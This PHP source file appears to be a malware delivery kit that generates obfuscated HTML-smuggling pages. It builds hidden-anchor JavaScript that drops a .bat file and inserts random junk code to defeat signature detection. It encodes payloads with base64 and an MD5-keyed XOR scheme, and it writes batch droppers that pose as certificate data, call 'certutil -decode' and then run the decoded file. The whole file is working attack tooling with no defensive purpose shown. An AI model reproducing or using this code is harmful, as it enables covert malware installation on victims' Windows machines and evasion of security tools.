<?php
if (!defined('PHP_VERSION_ID')) {
    $version = explode('.', PHP_VERSION);

    define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
}

$strings_array = array("	"," ","\n");
$strings2_array = array(" ","","\n");

$codes = array(
  array(2,'
var __param1__ = "__param2__";
'),
  array(3,'
function __param1__(){
   var __param2__="__param3__";
}
'),
  array(4,'
if ("__param1__" == "__param2__") {
  __param3__ = "__param4__";
}
')
);
$downloadFunctionStr = '
function download(__fr__,__tr__) {
  /*__random_code__*/
  var __vr__ = /*__random_function__*/ document.createElement("a");/*__random_function__*/
  /*__random_code__*/
  __vr__.setAttribute/*__random_function__*/("href",/*__random_function__*/"data:text/plain;charset=utf-8," + /*__random_function__*/encodeURIComponent/*__random_function__*/(__tr__));/*__random_function__*/
  /*__random_code__*/
  __vr__.setAttribute/*__random_function__*/("download", __fr__);/*__random_function__*/;/*__random_function__*/
  /*__random_code__*/
  __vr__.style.display /*__random_function__*/= /*__random_function__*/ "none";/*__random_function__*/
  /*__random_code__*/
  document.body.appendChild/*__random_function__*/(__vr__)/*__random_function__*/;/*__random_function__*/
  /*__random_code__*/
  __vr__.click();/*__random_function__*/
  /*__random_code__*/
  document.body.removeChild/*__random_function__*/(__vr__)/*__random_function__*/;
  /*__random_code__*/
}';
$generateInvokeStr = '
/*__random_function__*/
/*__random_code__*/
var __fr__ = "__nr__.bat";/*__random_function__*/
/*__random_code__*/
__decodebatch__
/*__random_function__*/
/*__random_code__*/
download/*__random_function__*/(__fr__,__tr__)/*__random_function__*/;
/*__random_code__*/
';

$generateInvokeStr2 = '
/*__random_function__*/
/*__random_code__*/
var __fr__ = "__nr__.bat";/*__random_function__*/
/*__random_code__*/
__decodebatch__
/*__random_function__*/
/*__random_code__*/
download/*__random_function__*/(__fr__,__tr__)/*__random_function__*/;
/*__random_code__*/
';

function generateRandomString() {
    $rand1 = rand(5,20);
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $rand1; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function randomFunction() {

    $rand1 = rand(1,2);

	if ($rand1 == "1") {
    	return randomTimesFixedStrings2(15);
	}
  return "";
}
function randomScriptCodeBlock(){
  global $codes;
  $block = rand(0,count($codes)-1);
  $code = $codes[$block];
  $codeStr = $code[1];
  for ($i=1;$i<=$code[0];$i++){
    //$codeStr = preg_replace('/__param__/', generateRandomString(), $codeStr, 1);
    $codeStr = str_replace("__param".$i."__", generateRandomString(), $codeStr);
  }
  return $codeStr;
}
function randomScriptCode($n) {
  $myString = "";
  for ($x = 0; $x <= rand(1,$n); $x++) {
    $myString .= randomScriptCodeBlock();
  }
  return $myString;
}

function randomTimesFixedStrings($n) {
  global $strings_array;
  $rand2 = rand(1,$n);
  $mystring = '';
  for ($i = 0; $i < $rand2; $i++) {
      $rand3 = rand(0,count($strings_array)-1);
      $mystring .= $strings_array[$rand3];
  }
  return $mystring;
}


function randomTimesFixedStrings2($n) {
  global $strings2_array;
  $rand2 = rand(1,$n);
  $mystring = '';
  for ($i = 0; $i < $rand2; $i++) {
      $rand3 = rand(0,count($strings2_array)-1);
      $mystring .= $strings2_array[$rand3];
  }
  return $mystring;
}

function genRandomString(){
  return randomTimesFixedStrings(10);
}
function genRandomString2(){
  return randomTimesFixedStrings2(15);
}
function genRandomCode(){
  return randomFunction() . randomScriptCode(5);
}
function genDownloadFunction(){
  global $downloadFunctionStr;
  $fr = generateRandomString();
  $tr = generateRandomString();
  $vr = generateRandomString();

  $ret = $downloadFunctionStr;
  $ret = str_replace("__fr__", $fr, $ret);
  $ret = str_replace("__tr__", $tr, $ret);
  $ret = str_replace("__vr__", $vr, $ret);
  preg_match_all("/".preg_quote("/*__","/")."([a-zA-Z_]+)".preg_quote("__*/","/")."/", $ret, $match);
  for($i=0;$i<count($match[0]);$i++){
    $replacement = "";
    if ($match[1][$i] == "random_function"){
      $replacement = randomFunction();
    } else if ($match[1][$i] == "random_code"){
      $replacement = randomScriptCode(5);
    }
    $ret = preg_replace("/".preg_quote($match[0][$i],"/")."/",$replacement, $ret, 1);
  }

  return $ret;


}
function generateDecodeBatPart($stringArray,&$retVars){
  $retString = "";
  $vars = array();
  if (!is_array($stringArray)){
    $stringArray = array($stringArray);
  }
  for($i=0;$i<count($stringArray);$i++){
    $var = generateRandomString();
    $vars[] = $var;
    $retString .= "var ".$var." = \"".$stringArray[$i]."\";\n";
  }
  $joinVar = generateRandomString();
  $retString .= "var ".$joinVar." = ".$vars[0];
  for($i=1;$i<count($vars);$i++){
    $retString .= " + ".$vars[$i];
  }
  $retString .= ";\n";
  $retVars[] = $joinVar;
  return $retString;
}

function generateDecodeBatOld($base64Bat,$lastVariable){
  $ret = "";
  $resultName = generateRandomString();
  $a = array(
    str_split ("certutil -decode"),
    array("  %~n0%~x0 ".$resultName.".bat && echo "),
    array("-----"),
    array("BEGIN "),
    str_split ("CERTIFICATE"),
    array("-----"),
    array($base64Bat),
    array("-----"),
    array("END "),
    str_split ("CERTIFICATE"),
    array("-----"),
    array(" && ".$resultName.".bat")
  );
  $interVars = array();
  foreach($a as $b){
    $ret .= generateDecodeBatPart($b,$interVars);
  }
  $ret .= "var ".$lastVariable." = ".$interVars[0];
  for($i=1;$i<count($interVars);$i++){
    $ret .= " + ". $interVars[$i];
  }
  return $ret;
}
function generateDecodeBatParts($base64Bat){
  $resultName = generateRandomString();
  $a = array(
      "@echo off\\r\\n",
      "echo | set /p=\\\"-----\\\" > ".$resultName.".b64\\r\\n",
      "echo | set /p=\\\"BEGIN \\\" >> ".$resultName.".b64\\r\\n",
      "echo | set /p=\\\"",
      str_split ("CERTIFICATE"),
      "\\\" >> ".$resultName.".b64\\r\\n",
      "echo ----- >> ".$resultName.".b64\\r\\n"
  );
  $b64Lines = str_split($base64Bat,64);
  for($i=0;$i<count($b64Lines);$i++){
    $a[] = "echo ".$b64Lines[$i].">>".$resultName.".b64\\r\\n";
  }
  $a = array_merge($a,array(
    "echo | set /p=\\\"-----\\\" >>".$resultName.".b64\\r\\n",
    "echo | set /p=\\\"END \\\">>".$resultName.".b64\\r\\n",
    "echo | set /p=\\\"",
    str_split ("CERTIFICATE"),
    "\\\" >> ".$resultName.".b64\\r\\n",
    "echo ----- >> ".$resultName.".b64\\r\\n",
    str_split ("certutil -F -decode"),
    "  ".$resultName.".b64 ".$resultName.".bat ",
    " && ".$resultName.".bat"
  ));
  return $a;
}
function generateDecodeBatString($base64Bat){
  $ret = "";
  $a = generateDecodeBatParts($base64Bat);
  for ($i=0;$i<count($a);$i++){
    $b = $a[$i];
    if (!is_array($b)){
      $ret = $ret . $b;
    } else {
      $ret = $ret . join("",$b);
    }
  }
  return str_replace('\\"','"',str_replace("\\r\\n","\r\n",$ret));
}
function generateDecodeBat($base64Bat,$lastVariable){
  $ret = "";
  $a = generateDecodeBatParts($base64Bat);
  /*
  $resultName = generateRandomString();
  $a = array(
      "@echo off\\r\\n",
      "echo | set /p=\\\"-----\\\" > ".$resultName.".b64\\r\\n",
      "echo | set /p=\\\"BEGIN \\\" >> ".$resultName.".b64\\r\\n",
      "echo | set /p=\\\"",
      str_split ("CERTIFICATE"),
      "\\\" >> ".$resultName.".b64\\r\\n",
      "echo ----- >> ".$resultName.".b64\\r\\n"
  );
  $b64Lines = str_split($base64Bat,64);
  for($i=0;$i<count($b64Lines);$i++){
    $a[] = "echo ".$b64Lines[$i].">>".$resultName.".b64\\r\\n";
  }
  $a = array_merge($a,array(
    "echo | set /p=\\\"-----\\\" >>".$resultName.".b64\\r\\n",
    "echo | set /p=\\\"END \\\">>".$resultName.".b64\\r\\n",
    "echo | set /p=\\\"",
    str_split ("CERTIFICATE"),
    "\\\" >> ".$resultName.".b64\\r\\n",
    "echo ----- >> ".$resultName.".b64\\r\\n",
    str_split ("certutil -F -decode"),
    "  ".$resultName.".b64 ".$resultName.".bat ",
    " && ".$resultName.".bat"
  ));
  */
  $interVars = array();
  foreach($a as $b){
    $ret .= generateDecodeBatPart($b,$interVars);
  }
  $ret .= "var ".$lastVariable." = ".$interVars[0];
  for($i=1;$i<count($interVars);$i++){
    $ret .= " + ". $interVars[$i];
  }
  return $ret;
}

function genInvokeDownload($bat){
  global $generateInvokeStr;
  $fr = generateRandomString();
  $tr = generateRandomString();
  $nr = generateRandomString();

  $ret = $generateInvokeStr;
  $ret = str_replace("__fr__", $fr, $ret);
  $ret = str_replace("__tr__", $tr, $ret);
  $ret = str_replace("__nr__", $tr, $ret);
  $ret = str_replace("__decodebatch__", generateDecodeBat($bat,$tr), $ret);
  preg_match_all("/".preg_quote("/*__","/")."([a-zA-Z_]+)".preg_quote("__*/","/")."/", $ret, $match);
  for($i=0;$i<count($match[0]);$i++){
    $replacement = "";
    if ($match[1][$i] == "random_function"){
      $replacement = randomFunction();
    } else if ($match[1][$i] == "random_code"){
      $replacement = randomScriptCode(5);
    }
    $ret = preg_replace("/".preg_quote($match[0][$i],"/")."/",$replacement, $ret, 1);
  }

  return $ret;
}
function generatePage($html,$bat){
  preg_match_all('/<!--__(.+)__-->/', $html, $match);
  for($i=0;$i<count($match[0]);$i++){
    $replacement = "";
    if ($match[1][$i] == "random_string"){
      $replacement = genRandomString();
    } else if ($match[1][$i] == "random_string2"){
      $replacement = genRandomString2();
    } else if ($match[1][$i] == "random_code"){
      $replacement = genRandomCode();
    } else if ($match[1][$i] == "download_function"){
      $replacement = genDownloadFunction();
    } else if ($match[1][$i] == "invoke_download"){
      $replacement = genInvokeDownload(base64_encode($bat));
    }
    $html = preg_replace("/".$match[0][$i]."/",$replacement, $html, 1);
  }

  return $html;
}

function randomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function generateBatFile1($batFile,$binaryContent,$execCommand,$extension){
  if (PHP_VERSION_ID >= 50000){
    $file = file_get_contents($batFile, FILE_USE_INCLUDE_PATH);
  } else {
    $file = file_get_contents($batFile, true);
  }

  $byteArray = unpack("C*",$binaryContent);

  $index = 0;
  $count = count($byteArray);
  $seed0 = randomString(50);
  $seed = $seed0;
  $out = array();
  while ($index < $count){
    $h = unpack('C*', md5 ($seed,true));
    $seed = md5 ($seed);
    $t1 = [];
    $t2 = [];
    $t3 = [];
    for ($i=1;($i<=16 && $index+$i <= $count);$i++){
      $out[] = $h[$i] ^ $byteArray[$index+$i];
      $t1[] = $h[$i];
      $t2[] = $byteArray[$index+$i];
      $t3[] = $h[$i] ^ $byteArray[$index+$i];
    }
    $index += 16;
  }
  $str = call_user_func_array("pack", array_merge(array("C*"), $out));
  $r = join("\r\n",str_split(base64_encode($str),64));

  $file = str_replace("__SEED__", $seed0, $file);
  $file = str_replace("__CONTENT__", $r, $file);
  $file = str_replace("__COMMAND__", $execCommand, $file);
  $file = str_replace("__EXTENSION__", $extension, $file);

  return $file;
}
function generateXorParts($binaryContent,$split=true){
  $byteArray = unpack("C*",$binaryContent);

  $index = 0;
  $count = count($byteArray);

  $seed0 = generateRandomString(50);
  $seed = $seed0;
  $out = array();
  $outXor = array();
  while ($index < $count){
    $h = unpack('C*', md5 ($seed,true));
    $seed = md5 ($seed);
    $t1 = [];
    $t2 = [];
    $t3 = [];
    for ($i=1;($i<=16 && $index+$i <= $count);$i++){
      $out[] = $h[$i] ^ $byteArray[$index+$i];
      $outXor[] = $h[$i];
    }
    $index += 16;
  }
  $str = call_user_func_array("pack", array_merge(array("C*"), $out));
  if ($split){
    $r = join("\r\n",str_split(base64_encode($str),64));
  } else {
    $r = base64_encode($str);
  }

  $str = call_user_func_array("pack", array_merge(array("C*"), $outXor));
  if ($split){
    $x = join("\r\n",str_split(base64_encode($str),64));
  } else {
    $x = base64_encode($str);
  }

  return array($r,$x);
}

function generateBatFile2($batFile,$binaryContent,$execCommand,$extension){
  if (PHP_VERSION_ID >= 50000){
    $file = file_get_contents($batFile, FILE_USE_INCLUDE_PATH);
  } else {
    $file = file_get_contents($batFile, true);
  }
  list($r,$x) = generateXorParts($binaryContent);
  /*
  $byteArray = unpack("C*",$binaryContent);

  $index = 0;
  $count = count($byteArray);

  $seed0 = generateRandomString(50);
  $seed = $seed0;
  $out = array();
  $outXor = array();
  while ($index < $count){
    $h = unpack('C*', md5 ($seed,true));
    $seed = md5 ($seed);
    $t1 = [];
    $t2 = [];
    $t3 = [];
    for ($i=1;($i<=16 && $index+$i <= $count);$i++){
      $out[] = $h[$i] ^ $byteArray[$index+$i];
      $outXor[] = $h[$i];
    }
    $index += 16;
  }
  $str = call_user_func_array("pack", array_merge(array("C*"), $out));
  $r = join("\r\n",str_split(base64_encode($str),64));

  $str = call_user_func_array("pack", array_merge(array("C*"), $outXor));
  $x = join("\r\n",str_split(base64_encode($str),64));
*/
  $file = str_replace("__CONTENT__", $r, $file);
  $file = str_replace("__XOR__", $x, $file);
  $file = str_replace("__COMMAND__", $execCommand, $file);
  $file = str_replace("__EXTENSION__", $extension, $file);

  return $file;
}


function genInvokeDownload2($bat){
  global $generateInvokeStr2;
  $fr = generateRandomString();
  $tr = generateRandomString();
  $nr = generateRandomString();

  $ret = $generateInvokeStr2;
  $ret = str_replace("__fr__", $fr, $ret);
  $ret = str_replace("__tr__", $tr, $ret);
  $ret = str_replace("__nr__", $tr, $ret);

  $batText = generateDecodeBatString($bat);
  list($r,$x) = generateXorParts(base64_encode($batText),false);
  $decodeBatch = 'var __tr__ = (
    function(__var1__,__var2__){
      var __var3__ = "";
      for(var i=0;i<__var1__.length;i++){
        __var3__ = __var3__ + String.fromCharCode(__var1__.charCodeAt(i) ^ __var2__.charCodeAt(i));
      }
      return atob(__var3__);
    }
    )(atob("__param1__"),atob("__param2__"));';
  $decodeBatch = str_replace("__var1__",generateRandomString(),$decodeBatch);
  $decodeBatch = str_replace("__var2__",generateRandomString(),$decodeBatch);
  $decodeBatch = str_replace("__var3__",generateRandomString(),$decodeBatch);
  $decodeBatch = str_replace("__tr__",$tr,$decodeBatch);
  $decodeBatch = str_replace("__param1__",$r,$decodeBatch);
  $decodeBatch = str_replace("__param2__",$x,$decodeBatch);

  $ret = str_replace("__decodebatch__", $decodeBatch, $ret);
  preg_match_all("/".preg_quote("/*__","/")."([a-zA-Z_]+)".preg_quote("__*/","/")."/", $ret, $match);
  for($i=0;$i<count($match[0]);$i++){
    $replacement = "";
    if ($match[1][$i] == "random_function"){
      $replacement = randomFunction();
    } else if ($match[1][$i] == "random_code"){
      $replacement = randomScriptCode(5);
    }
    $ret = preg_replace("/".preg_quote($match[0][$i],"/")."/",$replacement, $ret, 1);
  }

  return $ret;
}
function generatePage2($html,$bat){
  preg_match_all('/<!--__(.+)__-->/', $html, $match);
  for($i=0;$i<count($match[0]);$i++){
    $replacement = "";
    if ($match[1][$i] == "random_string"){
      $replacement = genRandomString();
    } else if ($match[1][$i] == "random_string2"){
      $replacement = genRandomString2();
    } else if ($match[1][$i] == "random_code"){
      $replacement = genRandomCode();
    } else if ($match[1][$i] == "download_function"){
      $replacement = genDownloadFunction();
    } else if ($match[1][$i] == "invoke_download"){
      $replacement = genInvokeDownload2(base64_encode($bat));
    }
    $html = preg_replace("/".$match[0][$i]."/",$replacement, $html, 1);
  }

  return $html;
}

?>
